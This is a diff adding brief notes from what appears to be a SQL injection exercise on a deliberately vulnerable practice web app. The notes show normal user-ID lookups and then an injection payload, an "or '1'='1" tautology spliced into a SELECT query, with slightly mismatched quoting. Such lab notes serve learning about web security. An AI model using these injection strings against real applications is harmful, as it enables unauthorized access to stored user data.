@@ -1,0 +1,25 @@
+Vulnerability: SQL Injection
+
+User ID -> 1 -> Submit
+
+ID: 1
+
+First name: admin
+
+Surname: admin
+
+User ID -> 2 -> Submit
+
+ID: 2
+
+First name: Gordon
+
+Surname: Brown
+
+SQL Injection
+
+SELECT first_name, last_name FROM users WHERE user_id = 'crypto' or '1'='1;
+
+or
+
+1'='1'
